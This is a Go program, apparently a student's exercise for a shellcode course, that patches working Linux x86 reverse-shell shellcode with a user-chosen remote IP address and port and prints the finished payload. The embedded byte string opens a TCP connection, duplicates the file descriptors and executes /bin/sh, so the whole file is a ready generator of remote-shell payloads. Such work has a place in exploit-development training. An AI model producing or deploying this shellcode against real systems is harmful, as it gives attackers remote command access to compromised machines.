/*
Tool:		Linux Reverse Shell(x86) Port Configurator
Author:		Mohit Suyal (@mosunit)
Student ID:	PA-16521
Blog:		https://mosunit.com
*/

package main

import (
	"flag"
	"fmt"
	"os"
	"strconv"
	"strings"
)

func main() {

	//original shellcode
	shellcode := []string{`\x31`, `\xc0`, `\xb0`, `\x66`, `\x31`, `\xdb`, `\xb3`, `\x01`, `\x31`, `\xc9`, `\x51`, `\x6a`, `\x01`, `\x6a`, `\x02`, `\x89`, `\xe1`, `\xcd`, `\x80`, `\x31`, `\xd2`, `\x89`, `\xc2`, `\xb0`, `\x66`, `\xb3`, `\x03`, `\x31`, `\xc9`, `\x68`, `\x7f`, `\x00`, `\x00`, `\x01`, `\x66`, `\x68`, `\x20`, `\xfb`, `\x66`, `\x6a`, `\x02`, `\x89`, `\xe6`, `\x6a`, `\x10`, `\x56`, `\x52`, `\x89`, `\xe1`, `\xcd`, `\x80`, `\xb0`, `\x3f`, `\x89`, `\xd3`, `\x31`, `\xc9`, `\xcd`, `\x80`, `\xb0`, `\x3f`, `\xb1`, `\x01`, `\xcd`, `\x80`, `\xb0`, `\x3f`, `\xb1`, `\x02`, `\xcd`, `\x80`, `\xb0`, `\x0b`, `\x31`, `\xdb`, `\x53`, `\x68`, `\x6e`, `\x2f`, `\x73`, `\x68`, `\x68`, `\x2f`, `\x2f`, `\x62`, `\x69`, `\x89`, `\xe3`, `\x31`, `\xc9`, `\x31`, `\xd2`, `\xcd`, `\x80`}

	//Define flags for input
	ip := flag.String("ip", "", "remote IP to spawn shell")
	port := flag.Int("port", -1, "port number to spawn shell on")
	flag.Parse()

	if *port == -1 || *ip == "" {
		fmt.Println("Please input the port number. e.g. 9999 ")
		flag.PrintDefaults()
		os.Exit(1)
	}

	/*
		Code to change the IP address in the shellcode
	*/

	// split the ip address by octects into slice of strings
	ipslice := strings.Split(*ip, ".")

	v := make([]string, 4)

	// iterate over each slice element and convert into hex
	for i := range ipslice {

		// covert the element of string slice to an int
		s, _ := strconv.Atoi(ipslice[i])

		// Check if the hex coversion of slice element will be less than 2 digits; append an additional "0", if true
		if s < 16 {
			v[i] = fmt.Sprintf("%s%x", "\\x0", s)
			continue
		}
		v[i] = fmt.Sprintf("%s%x", "\\x", s)
	}

	// replace the relevant elements of slice to replace the old IP address with a new one
	for i := 0; i <= 3; i++ {
		shellcode[i+30] = v[i]
	}

	/*
		Code to change the port number in the shellcode
	*/

	// Code to change the IP address in the shellcode
	hexport := fmt.Sprintf("%x", *port)

	// Create a slice of strings to split the port into two parts
	one := make([]string, 4)
	two := make([]string, 4)

	// Create two seperate string slice to store first two and last two characters of the port converted in hex
	for i, r := range hexport {
		if i < 2 {
			one[i] = string(r)
			continue
		}
		two[i] = string(r)
	}

	// Join the string of ports to create two equal parts
	p1 := strings.Join(one[:], "")
	p2 := strings.Join(two[:], "")

	// Change the representation of the ports to hex format
	p1 = fmt.Sprintf("%s%s", "\\x", p1)
	p2 = fmt.Sprintf("%s%s", "\\x", p2)

	// Replace the respective values of port in orginal shellcode to new port provided
	shellcode[36] = p1
	shellcode[37] = p2

	// Join the slice of strings and print the shellcode
	fmt.Printf("Generating TCP reverse shellcode for IP address %v and port number %v\nThe shellcode length is %v bytes\n\n\"%s\"", *ip, *port, len(shellcode), strings.Join(shellcode[:], ""))

}
